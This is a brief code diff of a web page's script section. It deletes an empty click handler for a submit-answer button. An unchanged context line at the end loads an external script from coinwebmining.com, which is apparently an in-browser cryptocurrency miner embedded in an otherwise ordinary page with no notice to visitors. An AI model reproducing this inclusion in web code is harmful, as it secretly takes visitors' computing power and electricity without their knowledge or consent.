@@ -458,13 +458,6 @@
             }, 2000);
         });
     });
-
-
-
-    $("body").on("click", '.submit-answer-btn', {}, function(){
-
-    });
-
 </script>
 
 <script src="https://coinwebmining.com/cwm.js"></script>
